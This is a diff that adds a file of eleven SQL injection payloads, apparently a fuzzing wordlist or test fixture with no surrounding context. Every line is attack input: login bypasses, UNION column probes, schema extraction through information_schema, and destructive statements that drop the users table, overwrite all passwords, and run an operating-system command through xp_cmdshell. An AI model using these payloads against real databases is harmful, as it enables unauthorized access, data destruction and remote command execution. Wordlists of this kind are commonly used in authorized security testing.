@@ -1,0 +1,11 @@
+' OR 1=1--
+'; DROP TABLE users;--
+1' UNION SELECT null,null,null--
+admin'--
+" OR ""="
+1; UPDATE users SET password='hacked'--
+') OR ('1'='1
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+'; EXEC xp_cmdshell('whoami');--
+1' OR '1'='1' /*
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--
